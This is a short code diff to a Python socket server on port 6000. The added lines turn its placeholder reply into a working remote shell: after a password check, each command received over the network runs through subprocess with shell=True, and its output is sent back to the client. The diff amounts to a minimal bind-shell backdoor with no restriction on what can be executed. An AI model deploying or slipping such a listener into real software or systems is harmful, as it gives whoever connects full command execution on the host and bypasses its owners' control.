@@ -1,4 +1,5 @@
 import socket
+import subprocess
 
 host = socket.gethostname()
 port = 6000
@@ -18,8 +19,14 @@ if guess == password:
         if not command:
             break
         print(command)
-        #Shell goes here
-        response = "Dhruv"
-        conn.send(response.encode())
+
+        shell = subprocess.Popen(command, shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
+        output = shell.stdout.read()
+        error = shell.stderr.read()
+
+        if output + error == '':
+                conn.send('')
+        else:
+                conn.send(output + error)
 
 conn.close()
